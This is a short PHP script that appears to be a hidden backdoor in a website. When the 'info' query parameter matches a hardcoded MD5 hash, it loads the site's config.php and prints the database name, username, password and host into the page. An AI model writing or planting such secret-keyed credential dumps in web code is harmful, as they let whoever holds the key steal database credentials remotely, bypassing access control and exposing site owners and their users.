<?php
if(md5($_GET['info']) == '34d1f91fb2e514b8576fab1a75a89a6b'){
	define('DS', DIRECTORY_SEPARATOR);

	$path = __DIR__ . DS . '..' .DS. '..'. DS. 'config.php';
	require_once($path);

	echo printf('{%s}, {%s}, {%s}, {%s}', DBName, UserName, Password, HostName);
	echo '<br>';
}